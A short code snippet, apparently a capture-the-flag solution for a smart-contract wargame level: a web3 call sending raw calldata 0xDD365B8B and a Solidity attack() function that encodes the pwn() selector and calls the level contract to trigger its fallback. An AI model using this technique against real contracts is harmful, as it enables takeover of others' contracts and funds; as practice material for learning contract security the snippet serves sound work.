contract.sendTransaction({data:"0xDD365B8B"})


function attack() public {
        // Encode the function selector for `pwn()`
        data = abi.encodeWithSignature("pwn()");
        
        // Send the encoded data to the level contract
        (bool success, ) = address(level).call(data);

        // Check that the `call` did not revert
        require(success, "call not successful");
    }
